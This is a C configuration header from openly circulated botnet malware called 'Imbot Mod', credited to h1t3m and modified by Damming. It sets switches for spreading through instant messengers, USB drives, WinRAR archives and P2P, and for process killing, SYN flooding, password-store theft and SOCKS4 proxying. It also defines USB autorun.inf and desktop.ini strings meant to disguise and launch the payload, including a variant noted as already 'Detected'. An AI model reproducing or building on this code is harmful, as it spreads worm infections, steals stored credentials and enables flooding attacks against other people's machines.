/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
Imbot Mod - A c&p bot made by h1t3m and modified by Damming
*/

//-------BASIC-------
#define NO_SERVICE  //buggy (some functions won't work)
//#define NO_UPDATE

//-------ANTI--------
//#define NO_KILLP
//#define NO_ANTI

//-------SPREAD-------
//#define NO_MSN
//#define NO_AIM
//#define NO_TRITON
//#define NO_USB
//#define NO_WINRAR
//#define NO_P2P
//#define NO_SEED

//-------OTHER--------
//#define NO_SUPERSYN
//#define NO_PSTORE
//#define NO_SOCK4


#define PING_TIMEOUT	200
#define IRCLINE			514
#define MAX_TOKENS		64
#define MAX_LOGINS		2
#define MAX_THREADS		512
#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		20
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22
#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383
#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX
#define FLOOD_DELAY		2000
#define SFLOOD_DELAY	7000
#define RUPTIME_DELAY	600000
#define SECURE_DELAY	600000
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#ifndef SIO_RCVALL
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#endif

/* //Detected
#define usbsleepfor			12000
#define usbrecyclerpath		"\\.System"
#define usbrecyclersubpath	"\\S-1-6-21-2434476501-1644491937-600003330-1213"
#define usbdeskdata			"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define usbdeskini			"\\Desktop.ini"
#define usbdeskaruninf		"\\autorun.inf"
#define usbarundata1		"[autorun]\r\nopen="
#define usbarundata2		"\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command="
#define usbarundata3		"\r\nshell\\open\\default=1"
#define usbfname			"Autorun.exe"
*/

#define usbsleepfor	12000
#define usbrecyclerpath			"\\driver"
#define usbrecyclersubpath		"\\usb"
#define usbdeskdata				"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define usbdeskini				"\\Desktop.ini"
#define usbdeskaruninf			"\\autorun.inf"
#define usbarundata1			"[autorun]\r\nopen="
#define usbarundata2			"\r\naction=Open\r\nshell\\open=Open\r\nshell\\open\\command="
#define usbarundata3			"\r\nUsb_Driver installed"